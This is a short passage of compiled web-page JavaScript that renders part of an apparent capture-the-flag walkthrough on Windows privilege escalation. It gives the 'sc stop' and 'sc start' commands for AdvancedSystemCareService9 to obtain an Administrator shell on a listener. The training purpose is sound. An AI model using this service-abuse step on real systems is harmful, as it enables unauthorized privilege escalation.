so;"),(0,a.kt)("p",null,"sc stop AdvancedSystemCareService9"),(0,a.kt)("p",null,"Shortly followed by;"),(0,a.kt)("p",null,"sc start AdvancedSystemCareService9"),(0,a.kt)("p",null,"Once this command runs, you will see you gain a shell as Administrator on our listener!"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")))}m.isMDXComponent=!0}}]);